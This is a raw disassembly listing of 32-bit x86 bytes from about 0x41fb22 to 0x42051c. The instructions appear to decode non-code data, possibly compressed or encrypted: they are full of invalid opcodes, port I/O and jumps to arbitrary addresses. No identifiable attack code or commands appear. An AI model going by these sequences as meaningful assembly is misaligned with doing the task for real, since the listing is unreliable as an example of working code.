  41fb22:	imul   ebp,DWORD PTR [esi],0x12
  41fb25:	push   esi
  41fb26:	push   ebp
  41fb27:	or     BYTE PTR [eax+0x153af781],0xac
  41fb2e:	jns    0x41fb41
  41fb30:	jmp    FWORD PTR [esi-0x12]
  41fb33:	lahf   
  41fb34:	add    cl,BYTE PTR [ebx]
  41fb36:	call   0xcb5b9386
  41fb3b:	popf   
  41fb3c:	adc    DWORD PTR [eax+0x7d],ebx
  41fb3f:	fisubr DWORD PTR [ebp-0x17]
  41fb42:	sbb    al,0x3e
  41fb44:	adc    BYTE PTR ds:0x913db4c7,0x53
  41fb4b:	sti    
  41fb4c:	imul   esi,DWORD PTR [eax-0x2ec06c24],0xfffffff3
  41fb53:	leave  
  41fb54:	or     eax,0x3bd0e941
  41fb59:	retf   
  41fb5a:	ja     0x41faf8
  41fb5c:	lahf   
  41fb5d:	lds    ecx,FWORD PTR [eax]
  41fb5f:	dec    esi
  41fb60:	mov    dh,0x85
  41fb62:	cld    
  41fb63:	sar    BYTE PTR [eax-0x32a738d0],1
  41fb69:	shl    DWORD PTR [ecx+0x77ae2b27],cl
  41fb6f:	add    DWORD PTR [ecx-0x58],edx
  41fb72:	popa   
  41fb73:	or     cl,0x89
  41fb76:	fdivr  DWORD PTR [edx-0x3f8c56a5]
  41fb7c:	fadd   st(0),st
  41fb7e:	es add ebx,ecx
  41fb81:	pop    ecx
  41fb82:	xchg   ebp,eax
  41fb83:	cli    
  41fb84:	xchg   BYTE PTR [edi-0x4c],ch
  41fb87:	mov    ch,0xb0
  41fb89:	pop    ecx
  41fb8a:	mov    ?,WORD PTR [esi+0x38c030b9]
  41fb90:	in     al,0x0
	...
  41fbf2:	add    BYTE PTR [eax],al
  41fbf4:	fsubr  QWORD PTR [eax]
  41fbf6:	mov    ah,ah
  41fbf8:	(bad)  
  41fbf9:	out    0xfe,al
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	das    
  41fc01:	lock in eax,dx
  41fc03:	fst    DWORD PTR [edx+0x52]
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    eax,0x8e000001
  41fc0d:	test   ecx,eax
  41fc0f:	mov    cl,0xf
  41fc11:	xor    BYTE PTR [edi+0x55],al
  41fc14:	mov    dl,0x94
  41fc16:	mov    ch,bh
  41fc18:	jge    0x41fc20
  41fc1a:	sub    ecx,DWORD PTR [ebp+0x92fa42f]
  41fc20:	bswap  esp
  41fc22:	mov    al,ds:0x778d106c
  41fc27:	test   bl,ch
  41fc29:	cdq    
  41fc2a:	pushf  
  41fc2b:	adc    DWORD PTR [edx+0x5e],esi
  41fc2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc2f:	fdiv   QWORD PTR [eax+0x6dec4429]
  41fc35:	push   eax
  41fc36:	rol    DWORD PTR [edi-0x3b3294b1],cl
  41fc3c:	mov    ch,BYTE PTR [eax+ebx*1]
  41fc3f:	xor    edi,eax
  41fc41:	dec    edi
  41fc42:	push   edi
  41fc43:	jge    0x41fbdb
  41fc45:	xchg   edi,eax
  41fc46:	lahf   
  41fc47:	out    0xe9,eax
  41fc49:	jo     0x41fcbb
  41fc4b:	mov    ds:0xc702e9d8,al
  41fc50:	cli    
  41fc51:	and    al,0x19
  41fc53:	sub    ecx,DWORD PTR [ecx-0x9d0b7a0]
  41fc59:	push   ds
  41fc5a:	cwde   
  41fc5b:	fwait
  41fc5c:	pop    edi
  41fc5d:	xchg   ecx,eax
  41fc5e:	jno    0x41fbf1
  41fc60:	inc    ebx
  41fc61:	(bad)  
  41fc62:	sub    al,0xa7
  41fc64:	cdq    
  41fc65:	or     DWORD PTR [ebp+0x6b140438],esi
  41fc6b:	je     0x41fc63
  41fc6d:	pop    ds
  41fc6e:	jp     0x41fc7b
  41fc70:	sub    ebx,DWORD PTR [edx-0x73]
  41fc73:	cld    
  41fc74:	iret   
  41fc75:	sahf   
  41fc76:	mov    ch,0x3f
  41fc78:	add    BYTE PTR [esi-0x80],ah
  41fc7b:	int    0x63
  41fc7d:	out    0xb6,al
  41fc7f:	jmp    0x53b8:0xca4c3386
  41fc86:	cmp    DWORD PTR [edi-0x443dc8ea],ecx
  41fc8c:	test   ecx,ebx
  41fc8e:	(bad)
  41fc91:	xchg   DWORD PTR [ebx+0x49],edx
  41fc94:	inc    esp
  41fc95:	fsubp  st(2),st
  41fc97:	sub    al,0x8
  41fc99:	or     ebx,DWORD PTR [eax+0xd]
  41fc9c:	mov    ah,0x89
  41fc9e:	or     DWORD PTR gs:[ebx+0x5b221ea],ebx
  41fca5:	jns    0x41fcb8
  41fca7:	cli    
  41fca8:	into   
  41fca9:	xchg   edi,eax
  41fcaa:	dec    ebp
  41fcab:	fadd   DWORD PTR [ecx-0xa2c59ff]
  41fcb1:	push   ebp
  41fcb2:	outs   dx,DWORD PTR ds:[esi]
  41fcb3:	pop    ss
  41fcb4:	popf   
  41fcb5:	push   ecx
  41fcb6:	ss scas eax,DWORD PTR es:[edi]
  41fcb8:	fst    DWORD PTR [edx]
  41fcba:	adc    edi,DWORD PTR [ebp+0x76]
  41fcbd:	fmul   QWORD PTR [edi-0x5f40b627]
  41fcc3:	ja     0x41fc73
  41fcc5:	jg     0x41fcad
  41fcc7:	xchg   ecx,eax
  41fcc8:	outs   dx,DWORD PTR ds:[esi]
  41fcc9:	lahf   
  41fcca:	inc    ebx
  41fccb:	not    DWORD PTR [esi]
  41fccd:	mov    ds:0x34a4c45e,al
  41fcd2:	daa    
  41fcd3:	fwait
  41fcd4:	or     al,0x74
  41fcd6:	neg    bh
  41fcd8:	add    cl,BYTE PTR [ecx+0x3747b538]
  41fcde:	xor    bh,cl
  41fce0:	xchg   edx,eax
  41fce1:	inc    edi
  41fce2:	mov    esi,0x4cfd23c5
  41fce7:	pop    es
  41fce8:	add    DWORD PTR [edx-0x6a1891fb],edx
  41fcee:	(bad)  
  41fcef:	pushf  
  41fcf0:	mov    esi,DWORD PTR [esi+0x16]
  41fcf3:	test   BYTE PTR [edx],cl
  41fcf5:	or     DWORD PTR [ecx-0xf2f28df],edx
  41fcfb:	or     BYTE PTR [ecx+0x65],dl
  41fcfe:	rcl    BYTE PTR [ecx],0x99
  41fd01:	dec    edi
  41fd02:	inc    ecx
  41fd03:	pop    ss
  41fd04:	sbb    esi,DWORD PTR [edi+0x1ead369]
  41fd0a:	in     al,0x57
  41fd0c:	fild   DWORD PTR [ecx+0x782fb4]
	...
  41fd72:	add    BYTE PTR [eax],al
  41fd74:	or     al,0x6a
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	icebp  
  41fd81:	(bad)  
  41fd82:	daa    
  41fd83:	fst    QWORD PTR [edi+0x53]
  41fd86:	add    DWORD PTR [eax],eax
  41fd88:	add    eax,0x52000001
  41fd8d:	imul   eax,DWORD PTR [esi],0x2529a343
  41fd93:	fimul  DWORD PTR [ebx+0x5a639841]
  41fd99:	lods   al,BYTE PTR ds:[esi]
  41fd9a:	and    BYTE PTR [ebx],ah
  41fd9c:	test   eax,0xcd885071
  41fda1:	stos   DWORD PTR es:[edi],eax
  41fda2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fda3:	dec    edi
  41fda4:	aas    
  41fda5:	lahf   
  41fda6:	push   esp
  41fda7:	enter  0x723b,0x70
  41fdab:	jg     0x41fdf7
  41fdad:	sti    
  41fdae:	push   ecx
  41fdaf:	inc    esp
  41fdb0:	pop    eax
  41fdb1:	add    BYTE PTR [ebp-0xc],0x8b
  41fdb5:	(bad)  
  41fdb6:	jmp    0x8c79:0xb78f8db
  41fdbd:	mov    al,ds:0x6a7539b5
  41fdc2:	aas    
  41fdc3:	scas   al,BYTE PTR es:[edi]
  41fdc4:	pop    ds
  41fdc5:	add    BYTE PTR [edi],bh
  41fdc7:	pop    ss
  41fdc8:	dec    esp
  41fdc9:	sahf   
  41fdca:	add    eax,0x95f25897
  41fdcf:	mov    ah,0x80
  41fdd1:	aas    
  41fdd2:	pop    edi
  41fdd3:	xor    al,BYTE PTR [ebp+0x64cd9aa6]
  41fdd9:	(bad)  
  41fdda:	idiv   DWORD PTR [edi]
  41fddc:	push   cs
  41fddd:	jmp    0x41fd7b
  41fddf:	sub    dl,dh
  41fde1:	pop    ebp
  41fde2:	lds    edi,FWORD PTR [eax-0x74e41ac7]
  41fde8:	retf   
  41fde9:	clc    
  41fdea:	mov    dh,0x73
  41fdec:	pop    edi
  41fded:	cwde   
  41fdee:	xchg   edx,eax
  41fdef:	pop    esp
  41fdf0:	gs dec esp
  41fdf2:	adc    eax,0x8986f873
  41fdf7:	jmp    0x41fde2
  41fdf9:	loope  0x41fe2b
  41fdfb:	jge    0x41fe23
  41fdfd:	lea    esp,[esi]
  41fdff:	push   esp
  41fe00:	mov    BYTE PTR [eax+0x59],bl
  41fe03:	imul   eax,DWORD PTR [ecx+0x61cd7319],0xffffffda
  41fe0a:	push   ss
  41fe0b:	enter  0x4fd7,0x8
  41fe0f:	push   0x768d7091
  41fe14:	push   ebp
  41fe15:	lods   al,BYTE PTR ds:[esi]
  41fe16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe17:	retf   0x1497
  41fe1a:	push   ebp
  41fe1b:	fsub   QWORD PTR [edi+0x794cb482]
  41fe21:	(bad)  
  41fe22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe23:	pop    ebx
  41fe24:	rol    DWORD PTR [ebp-0x12c667f3],0x8c
  41fe2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe2c:	pop    ss
  41fe2d:	fld    DWORD PTR [esi]
  41fe2f:	cmp    al,0x93
  41fe31:	mov    BYTE PTR [ecx-0x35813508],dh
  41fe37:	push   edi
  41fe38:	rcr    DWORD PTR [ebx],0x5d
  41fe3b:	mov    edx,DWORD PTR [ebx-0x502b4749]
  41fe41:	xchg   ebx,eax
  41fe42:	stos   BYTE PTR es:[edi],al
  41fe43:	fwait
  41fe44:	add    DWORD PTR ds:0xf537fbcf,ecx
  41fe4a:	pop    esi
  41fe4b:	push   esp
  41fe4c:	test   eax,0x59002f21
  41fe51:	and    eax,ebp
  41fe53:	xor    bl,BYTE PTR [ebx-0xc]
  41fe56:	loopne 0x41fe76
  41fe58:	xor    eax,0x8fe557aa
  41fe5d:	in     al,0x81
  41fe5f:	daa    
  41fe60:	xor    ecx,esi
  41fe62:	cmp    DWORD PTR ds:0x23dede0a,eax
  41fe68:	fs mov ebx,0x56ab3cad
  41fe6e:	sub    al,BYTE PTR [ecx-0x47a1d84f]
  41fe74:	mov    BYTE PTR [eax],bh
  41fe76:	addr16 jo 0x41fed7
  41fe79:	fstp   TBYTE PTR [ecx]
  41fe7b:	and    BYTE PTR [ebx-0x2e272b81],dh
  41fe81:	jae    0x41fe9b
  41fe83:	gs mov esi,0xc230fd30
  41fe89:	and    ah,dl
  41fe8b:	mov    DWORD PTR [ebp+0x7b5dd2cc],edi
	...
  41fef1:	add    BYTE PTR [eax],al
  41fef3:	add    BYTE PTR [edx-0x1865ab],ch
  41fef9:	out    dx,eax
  41fefa:	call   FWORD PTR [ebp-0x5]
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x72
  41ff01:	sub    BYTE PTR [eax],0xf0
  41ff04:	pop    esp
  41ff05:	push   esp
  41ff06:	add    DWORD PTR [eax],eax
  41ff08:	add    eax,0xa0000001
  41ff0d:	loopne 0x41fed9
  41ff0f:	mov    ch,0xad
  41ff11:	push   esi
  41ff12:	lahf   
  41ff13:	sub    ebx,DWORD PTR [edx+0x7a9786bf]
  41ff19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff1a:	jp     0x41ff54
  41ff1c:	and    BYTE PTR [eax+0x37],bl
  41ff1f:	xor    eax,0x35dc7ff2
  41ff24:	sar    DWORD PTR [ebp-0x12],cl
  41ff27:	cmp    DWORD PTR [edi+0x56],ebp
  41ff2a:	out    0x10,eax
  41ff2c:	xlat   BYTE PTR ds:[ebx]
  41ff2d:	popf   
  41ff2e:	fld    st(0)
  41ff30:	loop   0x41febb
  41ff32:	in     al,0x55
  41ff34:	(bad)
  41ff37:	loop   0x41ff03
  41ff39:	fwait
  41ff3a:	popa   
  41ff3b:	fbld   TBYTE PTR [ebx-0x4e]
  41ff3e:	or     al,0x84
  41ff40:	push   cs
  41ff41:	imul   esi,esp,0x9098800c
  41ff47:	adc    ah,dh
  41ff49:	xchg   ebp,eax
  41ff4a:	call   0x18ab82d8
  41ff4f:	jmp    0xf511e688
  41ff54:	imul   esp,DWORD PTR [edi],0xa09ba5dd
  41ff5a:	sub    edi,DWORD PTR [esi]
  41ff5c:	pop    ebx
  41ff5d:	xchg   BYTE PTR [ebp-0x8],dh
  41ff60:	icebp  
  41ff61:	cmp    ah,BYTE PTR [ebx]
  41ff63:	repnz pop ebp
  41ff65:	das    
  41ff66:	gs adc eax,0x640cb282
  41ff6c:	(bad)  
  41ff6d:	xlat   BYTE PTR ds:[ebx]
  41ff6e:	add    DWORD PTR [edx+0x5b],eax
  41ff71:	mov    ch,BYTE PTR [ecx+0x2b9e3f5a]
  41ff77:	imul   esp,DWORD PTR [esi+0xa],0x4d86110e
  41ff7e:	sbb    BYTE PTR ds:0x506bcb2d,0x4b
  41ff85:	mov    edx,0x26aab317
  41ff8a:	es data16 cli 
  41ff8d:	lods   al,BYTE PTR ds:[esi]
  41ff8e:	xchg   ebp,eax
  41ff8f:	push   0xc4fc5cf4
  41ff94:	dec    edi
  41ff95:	jp     0x41ff24
  41ff97:	in     eax,0xc2
  41ff99:	loop   0x41ff50
  41ff9b:	sbb    al,0x22
  41ff9d:	push   esp
  41ff9e:	xor    al,0xbd
  41ffa0:	sub    eax,0xb665df4f
  41ffa5:	lods   eax,DWORD PTR ds:[esi]
  41ffa6:	mov    ah,0x2c
  41ffa8:	stos   DWORD PTR es:[edi],eax
  41ffa9:	(bad)  [esi+edx*2+0x45]
  41ffad:	in     al,dx
  41ffae:	and    BYTE PTR [ebx+0x57ef7807],al
  41ffb4:	in     eax,0xdb
  41ffb6:	sub    DWORD PTR [ecx+0x4c],ebx
  41ffb9:	leave  
  41ffba:	adc    ecx,edi
  41ffbc:	jmp    DWORD PTR [ecx]
  41ffbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffbf:	enter  0xaab4,0xfb
  41ffc3:	call   0xbc4f:0xcab95bec
  41ffca:	ins    BYTE PTR es:[edi],dx
  41ffcb:	lods   eax,DWORD PTR ds:[esi]
  41ffcc:	pop    ecx
  41ffcd:	enter  0x8938,0x99
  41ffd1:	lods   al,BYTE PTR ds:[esi]
  41ffd2:	inc    edi
  41ffd3:	push   0xffffffad
  41ffd5:	xor    bh,BYTE PTR ds:0x56dc6e17
  41ffdb:	xor    eax,esi
  41ffdd:	xlat   BYTE PTR ds:[ebx]
  41ffde:	jmp    0x6bd7:0xf5f8b42a
  41ffe5:	fadd   st(3),st
  41ffe7:	cwde   
  41ffe8:	scas   al,BYTE PTR es:[edi]
  41ffe9:	sbb    eax,0x29aa7759
  41ffee:	jne    0x41ff84
  41fff0:	aaa    
  41fff1:	enter  0x73e7,0x14
  41fff5:	dec    ebx
  41fff6:	push   ebx
  41fff7:	bnd jg 0x42003c
  41fffa:	cmp    esp,edx
  41fffc:	ficomp WORD PTR [edx]
  41fffe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffff:	xchg   eax,eax
  420001:	inc    edx
  420002:	dec    edi
  420003:	cwde   
  420004:	jmp    0x41ff8a
  420006:	(bad)  
  420008:	mov    cl,0xb8
  42000a:	in     al,dx
  42000b:	dec    edi
  42000c:	add    BYTE PTR [esi-0x13],ah
  42000f:	gs jmp 0x420012
	...
  420072:	add    BYTE PTR [eax],al
  420074:	bound  esp,QWORD PTR [ebp-0x8808a]
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x36
  420081:	add    dh,BYTE PTR [esi+0x15561fc]
  420087:	add    BYTE PTR ds:0x20000001,al
  42008d:	in     eax,0x16
  42008f:	stos   DWORD PTR es:[edi],eax
  420090:	push   esi
  420091:	sub    DWORD PTR [ecx-0x16],eax
  420094:	in     al,0x46
  420096:	mov    bl,0xd7
  420098:	mov    es,eax
  42009a:	sub    BYTE PTR [ecx+0x47eb9a8e],dh
  4200a0:	loop   0x420036
  4200a2:	mov    edi,0x516f6e69
  4200a7:	push   ecx
  4200a8:	aas    
  4200a9:	(bad)  
  4200aa:	(bad)  
  4200ab:	adc    DWORD PTR [edx-0x749ac567],ebx
  4200b1:	outs   dx,DWORD PTR ds:[esi]
  4200b2:	adc    dh,BYTE PTR [ecx]
  4200b4:	lds    eax,FWORD PTR [ebx]
  4200b6:	mov    BYTE PTR [ebp-0x1d8b4939],0xcd
  4200bd:	out    dx,al
  4200be:	adc    BYTE PTR [ecx],cl
  4200c0:	dec    esp
  4200c1:	fild   DWORD PTR [eax-0x1b841e73]
  4200c7:	pop    esp
  4200c8:	pop    ds
  4200c9:	push   cs
  4200ca:	cwde   
  4200cb:	xchg   esi,eax
  4200cc:	inc    ecx
  4200cd:	jns    0x420104
  4200cf:	retf   
  4200d0:	cmp    eax,0x90f53407
  4200d5:	fisttp WORD PTR [ecx-0x2b99f06d]
  4200db:	fnsave [edx-0x1f]
  4200de:	shl    ah,cl
  4200e0:	lahf   
  4200e1:	pop    ebx
  4200e2:	mov    eax,ds:0x481b56c1
  4200e7:	push   ecx
  4200e8:	mov    ?,WORD PTR [edi-0x5d0560ca]
  4200ee:	cmp    ebx,ecx
  4200f0:	test   eax,0x7abb40b4
  4200f5:	inc    esp
  4200f6:	jg     0x420090
  4200f8:	in     al,dx
  4200f9:	nop
  4200fa:	repz mov bl,0x47
  4200fd:	xchg   esi,eax
  4200fe:	mov    ds:0x5875889a,eax
  420103:	jp     0x4200f8
  420105:	adc    edx,DWORD PTR [edx-0x4c629bab]
  42010b:	add    dl,BYTE PTR [eax+0x2d951755]
  420111:	jb     0x4200a1
  420113:	mov    al,ds:0xba69cb2
  420118:	cmp    eax,0x1b4b3e07
  42011d:	nop
  42011e:	ins    DWORD PTR es:[edi],dx
  42011f:	cmp    al,0x22
  420121:	into   
  420122:	pop    edi
  420123:	cld    
  420124:	adc    al,BYTE PTR [esi+0x7f886117]
  42012a:	jl     0x42017f
  42012c:	pushf  
  42012d:	adc    eax,0x92b5eaf1
  420132:	iret   
  420133:	aaa    
  420134:	cmp    BYTE PTR [ebp-0x9],cl
  420137:	fs test eax,0xbfc78a14
  42013d:	rcl    ecx,cl
  42013f:	dec    eax
  420140:	xchg   edx,eax
  420141:	sahf   
  420142:	je     0x42019a
  420144:	psubw  mm2,mm5
  420147:	sahf   
  420148:	stos   DWORD PTR es:[edi],eax
  420149:	repnz pusha 
  42014b:	jo     0x42011c
  42014d:	cld    
  42014e:	int3   
  42014f:	mov    edi,DWORD PTR [eax-0x42]
  420152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420153:	mov    ds:0x17ac866f,eax
  420158:	push   ss
  420159:	inc    eax
  42015a:	test   al,0x4
  42015c:	xchg   ecx,eax
  42015d:	inc    esp
  42015e:	ror    BYTE PTR [edi+0x70f6e087],cl
  420164:	sbb    DWORD PTR [edi+0x2701d178],ebx
  42016a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42016b:	pop    edi
  42016c:	or     DWORD PTR [edx],ebx
  42016e:	fimul  WORD PTR [eax+0x50]
  420171:	dec    ebx
  420172:	cmp    esi,DWORD PTR [ecx+0x3acda631]
  420178:	sub    DWORD PTR [ecx],ebp
  42017a:	cld    
  42017b:	inc    ebx
  42017c:	and    DWORD PTR [ecx-0x47],0xeb251983
  420183:	popf   
  420184:	(bad)  
  420185:	push   ebx
  420186:	loopne 0x420155
  420188:	(bad)  
  420189:	or     bh,dh
  42018b:	mov    ch,0x34
  42018d:	mov    ebp,0x4d602a
	...
  4201f2:	add    BYTE PTR [eax],al
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x57c518a5],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0x68000001
  42020d:	and    BYTE PTR [edx],bh
  42020f:	push   ecx
  420210:	push   eax
  420211:	dec    edi
  420212:	push   ecx
  420213:	xchg   BYTE PTR [eax+esi*8],cl
  420216:	lock push ebx
  420218:	adc    al,0xcd
  42021a:	push   ebp
  42021c:	jl     0x42028c
  42021e:	repnz mov ah,0xb8
  420221:	fiadd  DWORD PTR [edx-0x54230099]
  420227:	push   edx
  420228:	cwde   
  420229:	outs   dx,BYTE PTR ds:[esi]
  42022a:	sub    al,0xb6
  42022c:	cwde   
  42022d:	aaa    
  42022e:	xchg   esi,eax
  42022f:	and    eax,0x4e26106b
  420234:	mov    al,0x9b
  420236:	loop   0x4201cd
  420238:	push   ss
  420239:	cmp    al,0x3
  42023b:	jl     0x420257
  42023d:	cmp    bl,BYTE PTR [edi]
  42023f:	xor    al,0x31
  420241:	pop    ebp
  420242:	mov    dl,BYTE PTR [ecx+0x62]
  420245:	push   esp
  420246:	add    al,0x1e
  420248:	mov    cl,al
  42024a:	mov    ecx,0xbd3f2190
  42024f:	clc    
  420250:	fild   QWORD PTR [edx-0x37ec0d3b]
  420256:	mov    esi,0xdd5710aa
  42025b:	xchg   edx,eax
  42025c:	add    BYTE PTR [edi+0x7c749e95],ch
  420262:	cwde   
  420263:	adc    ah,BYTE PTR [edi+ecx*8]
  420266:	fldcw  WORD PTR [eax]
  420268:	cdq    
  420269:	mov    ds:0x20b890b,eax
  42026e:	jnp    0x4202ad
  420270:	outs   dx,DWORD PTR ds:[esi]
  420271:	jbe    0x4202be
  420273:	nop
  420274:	hlt    
  420275:	(bad)
  420279:	xlat   BYTE PTR ds:[ebx]
  42027a:	jle    0x4202ec
  42027c:	xor    ebp,ecx
  42027e:	test   BYTE PTR [ebp+0x75db764c],cl
  420284:	sbb    al,0x93
  420286:	std    
  420287:	fnstenv [ebx-0x22]
  42028a:	in     al,dx
  42028b:	fbld   TBYTE PTR [ecx]
  42028d:	push   es
  42028e:	rcl    DWORD PTR [ebx+0x2f],cl
  420291:	ret    
  420292:	mov    dl,0x1b
  420294:	mov    ebx,0xe51e2558
  420299:	cmp    bh,BYTE PTR [eax+0x61bbfec9]
  42029f:	pop    esp
  4202a0:	ins    DWORD PTR es:[edi],dx
  4202a1:	retf   
  4202a2:	out    dx,eax
  4202a3:	loop   0x420274
  4202a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202a6:	in     eax,dx
  4202a7:	sbb    al,0x3
  4202a9:	or     eax,0x5db20ead
  4202ae:	cmc    
  4202af:	sti    
  4202b0:	(bad)  
  4202b1:	inc    edi
  4202b2:	fidivr DWORD PTR [ecx+ecx*4-0xa]
  4202b6:	sub    BYTE PTR [edx+0x77],bl
  4202b9:	push   0x71c7df0f
  4202be:	push   eax
  4202bf:	lods   eax,DWORD PTR ds:[esi]
  4202c0:	xchg   esi,eax
  4202c1:	loope  0x4202b5
  4202c3:	pop    esp
  4202c4:	lods   eax,DWORD PTR ds:[esi]
  4202c5:	repz out 0x3b,eax
  4202c8:	push   esi
  4202c9:	dec    esp
  4202ca:	ds pop ebp
  4202cc:	xor    al,0x65
  4202ce:	and    eax,DWORD PTR [esi+0x25]
  4202d1:	cmp    eax,0xc72ffd0c
  4202d6:	xchg   DWORD PTR fs:[esi-0x53],esp
  4202da:	inc    ebx
  4202db:	and    bl,dh
  4202dd:	lods   eax,DWORD PTR ds:[esi]
  4202df:	xchg   ebp,eax
  4202e0:	xlat   BYTE PTR ds:[ebx]
  4202e1:	mov    ebx,0x557d0e85
  4202e6:	sar    DWORD PTR [esi-0x72],cl
  4202e9:	push   ebp
  4202ea:	dec    esi
  4202eb:	or     DWORD PTR [edi+0x55304ae3],esi
  4202f1:	sbb    BYTE PTR [ebx+0x24ecf3d1],dh
  4202f7:	cmp    BYTE PTR [ebx],dl
  4202f9:	inc    esp
  4202fa:	mov    edx,0xc818157f
  4202ff:	popf   
  420300:	dec    ecx
  420301:	outs   dx,BYTE PTR ds:[esi]
  420302:	pop    edi
  420303:	out    dx,eax
  420304:	mov    esp,0x256c84cc
  420309:	dec    edi
  42030a:	jbe    0x420307
  42030c:	lods   al,BYTE PTR ds:[esi]
  42030d:	add    eax,0x54f07f
	...
  420372:	add    BYTE PTR [eax],al
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	jle    0x4203bc
  420382:	repnz push ebx
  420384:	imul   edx,DWORD PTR [edi+0x1],0x0
  420388:	add    eax,0xb8000001
  42038d:	xchg   ecx,eax
  42038e:	repz mov ds:0xaa71c96a,al
  420394:	cmp    BYTE PTR ds:0xb739cf6c,ah
  42039a:	xor    DWORD PTR [ecx+0x586e4f0e],ebx
  4203a0:	enter  0x9ed,0xeb
  4203a4:	sbb    al,0xe3
  4203a6:	and    cl,BYTE PTR [ebp-0x7b]
  4203a9:	jmp    0xa5fb:0x16adac42
  4203b0:	mov    bl,0xeb
  4203b2:	xchg   esp,eax
  4203b3:	(bad)  
  4203b4:	cmp    dh,dh
  4203b6:	lock push 0xf8491415
  4203bc:	in     al,0xbb
  4203be:	ds inc ebp
  4203c0:	dec    esp
  4203c1:	in     eax,0x4
  4203c3:	std    
  4203c4:	mov    ebp,0x8218bc92
  4203c9:	out    dx,al
  4203ca:	inc    DWORD PTR [ecx]
  4203cc:	push   edi
  4203cd:	ins    BYTE PTR es:[edi],dx
  4203ce:	in     eax,0x7f
  4203d0:	ss call 0x95d29b11
  4203d6:	mov    ds:0x37e98a5c,eax
  4203db:	shr    DWORD PTR [ecx],1
  4203dd:	loopne 0x4203b6
  4203df:	shr    BYTE PTR [esp+eax*1+0x2ae3537f],1
  4203e6:	(bad)  
  4203e8:	ss std 
  4203ea:	pop    esp
  4203eb:	out    0x17,eax
  4203ed:	js     0x4203fe
  4203ef:	and    ebp,DWORD PTR [ebx+0x57d4488f]
  4203f5:	pop    ds
  4203f6:	popa   
  4203f7:	mov    cl,BYTE PTR [ebx+0x33]
  4203fa:	xlat   BYTE PTR ds:[ebx]
  4203fb:	mov    bl,ah
  4203fd:	fst    DWORD PTR [edi]
  4203ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420400:	js     0x4203ad
  420402:	sub    edi,DWORD PTR [edx-0x4b1e4445]
  420408:	jmp    0xffa6a006
  42040d:	arpl   WORD PTR [edx],cx
  42040f:	mov    dl,0xc8
  420411:	sub    DWORD PTR [edi-0x2d],0xffffffd9
  420415:	xchg   ebp,eax
  420416:	pop    ebp
  420417:	shl    cl,0xa
  42041a:	jp     0x420462
  42041c:	jo     0x42043b
  42041e:	sti    
  42041f:	rcr    DWORD PTR [ebx+0x24],1
  420422:	sbb    BYTE PTR [edi+0x3a],bl
  420425:	in     al,0xb1
  420427:	jb     0x420407
  420429:	inc    BYTE PTR [eax-0x46]
  42042c:	stos   DWORD PTR es:[edi],eax
  42042d:	sti    
  42042e:	les    ecx,FWORD PTR [esp+ebp*8]
  420431:	les    edi,FWORD PTR [edx+0x6f6859b8]
  420437:	and    DWORD PTR [eax-0x3f],0x10
  42043b:	clc    
  42043c:	xchg   esi,eax
  42043d:	mov    edi,esi
  42043f:	inc    ebx
  420440:	addr16 loop 0x420498
  420443:	jae    0x4203cd
  420445:	inc    esp
  420446:	dec    eax
  420447:	push   esi
  420448:	mov    ch,0x21
  42044a:	jns    0x420466
  42044c:	and    BYTE PTR [bx+si+0x57],ch
  420450:	add    BYTE PTR [edx+0x6403612],bl
  420456:	cmp    DWORD PTR [ecx+edx*1-0x4dee34fc],edx
  42045d:	sbb    dh,BYTE PTR [ebp+edx*2+0x2398d283]
  420464:	jns    0x4204c9
  420466:	syscall 
  420468:	mov    edi,DWORD PTR [eax+0x3]
  42046b:	into   
  42046c:	push   0x7a
  42046e:	out    0x62,al
  420470:	or     DWORD PTR [esi],edx
  420472:	imul   edi,DWORD PTR [edx-0x20],0xffffffa9
  420476:	aaa    
  420477:	jne    0x4203ff
  420479:	mov    WORD PTR [edx],cs
  42047b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42047c:	dec    esi
  42047d:	inc    edi
  42047e:	shl    BYTE PTR [edx+0x1a],cl
  420481:	test   BYTE PTR [edi],ch
  420483:	test   BYTE PTR [ebx+0x415f4793],0x2a
  42048a:	sahf   
  42048b:	xchg   edi,eax
  42048c:	bound  ecx,QWORD PTR [edx+0xe279dc]
	...
  4204f2:	add    BYTE PTR [eax],al
  4204f4:	scas   al,BYTE PTR es:[edi]
  4204f5:	xchg   esp,eax
  4204f6:	push   edi
  4204f7:	adc    bh,BYTE PTR [edi-0x2d]
  4204fa:	out    dx,eax
  4204fb:	mov    esp,0x5a7f6c39
  420500:	jge    0x4204fb
  420502:	cmc    
  420503:	dec    edi
  420504:	jo     0x42055e
  420506:	add    DWORD PTR [eax],eax
  420508:	add    eax,0x87000001
  42050d:	and    edx,DWORD PTR [eax]
  42050f:	retf   0xe871
  420512:	sbb    eax,0x3b8d9ff
  420517:	cli    
  420518:	std    
  420519:	in     eax,0xcf
  42051b:	std    
  42051c:	and    al,0x3c
